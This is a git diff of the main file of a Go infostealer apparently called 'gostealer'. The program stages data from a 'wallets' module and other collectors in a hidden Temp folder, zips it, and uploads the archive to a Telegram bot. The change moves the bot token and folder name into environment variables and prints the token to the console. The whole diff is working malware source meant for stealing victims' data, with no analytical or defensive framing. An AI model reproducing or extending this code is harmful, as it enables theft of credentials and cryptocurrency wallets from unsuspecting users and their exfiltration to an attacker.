@@ -10,13 +10,17 @@ import (
 	"github.com/4kord/gostealer/utils"
 	"github.com/4kord/gostealer/wallets"
 	"github.com/alexmullins/zip"
+	"github.com/joho/godotenv"
 
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
 func main() {
+    //Env
+    godotenv.Load()
+    fmt.Println(os.Getenv("TOKEN"))
 
-	logFolderPath := path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9")
+	logFolderPath := path.Join(os.Getenv("localappdata"), "Temp", os.Getenv("TEMP_FOLDER_NAME"))
 	wg := sync.WaitGroup{}
 	//Create folder structure
 	utils.CreateStructure(logFolderPath)
@@ -93,7 +97,7 @@ func main() {
 	wg.Wait()
 
 	//Create zip
-	outFile, err := os.Create(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
+	outFile, err := os.Create(path.Join(os.Getenv("localappdata"), "Temp", fmt.Sprintf("%v.zip", os.Getenv("TEMP_FOLDER_NAME"))))
 	if err != nil {
 		panic(err)
 	}
@@ -113,12 +117,12 @@ func main() {
 	}
 
 	//Send log
-	file, err := os.ReadFile(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
+	file, err := os.ReadFile(path.Join(os.Getenv("localappdata"), "Temp", fmt.Sprintf("%v.zip", os.Getenv("TEMP_FOLDER_NAME"))))
 	if err != nil {
 		panic(err)
 	}
 
-	bot, err := tgbotapi.NewBotAPI("") // Telegram token
+	bot, err := tgbotapi.NewBotAPI(os.Getenv("TOKEN")) // Telegram token
 	if err != nil {
 		panic(err)
 	}
